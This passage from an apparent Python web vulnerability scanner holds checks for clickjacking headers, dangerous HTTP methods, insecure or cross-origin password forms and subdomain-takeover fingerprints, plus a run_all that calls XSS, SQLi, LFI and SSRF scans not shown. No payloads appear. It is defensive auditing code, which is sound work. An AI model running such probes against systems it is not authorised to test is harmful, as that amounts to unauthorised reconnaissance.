            resp = safe_get(self.session, target, self.timeout, raise_for_status=False)
            if not resp:
                return findings

            x_frame = resp.headers.get("X-Frame-Options", "").lower()
            csp = resp.headers.get("Content-Security-Policy", "").lower()

            allows_frame = not any(directive in csp for directive in CLICKJACKING_SAFE_DIRECTIVES)
            missing_protection = not x_frame and allows_frame

            if missing_protection:
                f = finding(
                    "Clickjacking Exposure",
                    target,
                    "medium",
                    "The application does not enforce frame protection headers or CSP frame-ancestors.",
                    f"X-Frame-Options: {x_frame or 'missing'}, CSP: {csp or 'missing'}",
                    recommendation="Add X-Frame-Options or a restrictive CSP frame-ancestors directive."
                )
                self._add(f)
                findings.append(f)
                log(f"  [CLICKJACKING] {target}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception as e:
            log(f"  [CLICKJACKING] Error scanning target: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return findings

    # ── HTTP Method Exposure ─────────────────────────────────────────────────────

    def scan_http_methods(self) -> list[dict]:
        """Scan for dangerous HTTP methods exposed by the server."""
        findings = []
        target = self.config.get("target", "")
        try:
            resp = self.session.options(target, timeout=self.timeout)
            if not resp:
                return findings

            allow_header = resp.headers.get("Allow", "")
            cors_methods = resp.headers.get("Access-Control-Allow-Methods", "")
            methods = set(self._normalize_list(allow_header) + self._normalize_list(cors_methods))
            dangerous = {"TRACE", "PUT", "DELETE", "PATCH", "PROPFIND"}
            exposed = [m for m in methods if m.upper() in dangerous]

            if exposed:
                f = finding(
                    "Dangerous HTTP Methods Enabled",
                    target,
                    "medium",
                    "The server supports non-safe HTTP methods that may increase attack surface.",
                    f"Allowed methods: {', '.join(sorted(methods))}",
                    recommendation="Disable TRACE, PUT, DELETE, PATCH, and other non-essential HTTP methods on the server."
                )
                self._add(f)
                findings.append(f)
                log(f"  [HTTP METHODS] {target} -> {', '.join(exposed)}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        except Exception as e:
            log(f"  [HTTP METHODS] Error scanning methods: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return findings

    # ── Insecure Forms ───────────────────────────────────────────────────────────

    def scan_insecure_forms(self) -> list[dict]:
        """Scan forms for insecure action URLs and cross-origin password submission."""
        findings = []
        for form in self.recon.get("forms", []):
            try:
                method = form.get("method", "get").lower()
                action = form.get("action", "")
                if not action or method != "post":
                    continue

                parsed = urlparse(action)
                if parsed.scheme == "http":
                    f = finding(
                        "Insecure Form Action",
                        action,
                        "high",
                        "A POST form submits sensitive data over an insecure HTTP connection.",
                        f"Form action uses http:// scheme",
                        recommendation="Use HTTPS for all form submissions, especially those carrying credentials."
                    )
                    self._add(f)
                    findings.append(f)
                    log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    continue

                if any(field.get("type") == "password" for field in form.get("fields", [])):
                    if parsed.netloc and not self._same_origin(action):
                        f = finding(
                            "Password Form Cross-Origin Submission",
                            action,
                            "high",
                            "A password field is submitting to a different origin than the target application.",
                            f"Action host: {parsed.netloc}",
                            recommendation="Submit passwords only to the same trusted origin or enforce an allowlist."
                        )
                        self._add(f)
                        findings.append(f)
                        log(f"  [FORM] {action}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [FORM] Error analyzing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Subdomain Takeover Detection ───────────────────────────────────────────

    def scan_subdomain_takeover(self) -> list[dict]:
        """Scan discovered subdomains for takeover fingerprints."""
        findings = []
        for subdomain in self.recon.get("subdomains", []):
            try:
                for scheme in ("http://", "https://"):
                    target_url = f"{scheme}{subdomain}"
                    resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                    if not resp or not resp.text:
                        continue

                    body = resp.text
                    for signature in TAKEOVER_SIGNATURES:
                        if signature.lower() in body.lower():
                            f = finding(
                                "Potential Subdomain Takeover",
                                target_url,
                                "high",
                                "A known takeover fingerprint was detected on the subdomain.",
                                f"Signature: {signature}",
                                impact="Subdomains without active services may be hijacked by attackers.",
                                recommendation="Remove unused DNS entries or provision the missing service."
                            )
                            self._add(f)
                            findings.append(f)
                            log(f"  [TAKEOVER] {target_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
                            raise StopIteration
            except StopIteration:
                continue
            except Exception as e:
                log(f"  [TAKEOVER] Error checking {subdomain}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Main scan orchestration ───────────────────────────────────────────────────

    def run_all(self) -> list[dict]:
        """Execute all vulnerability scans."""
        try:
            log("  [scanner] Starting vulnerability scans...", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            
            # Run all scans (can be parallelized if needed)
            self.scan_xss()
            self.scan_sqli()
            self.scan_lfi()
            self.scan_ssrf()
            self.scan_open_redirect()
            self.scan_headers()
            
            log(f"  [scanner] Found {len(self.findings)} vulnerabilities", Colors.CYAN, verbose_only=True, verbose=self.verbose)
            return self.findings
            
        except Exception as e:
            log(f"  [scanner] Fatal error during scanning: {e}", Colors.RED, verbose_only=True, verbose=self.verbose)
            return self.findings
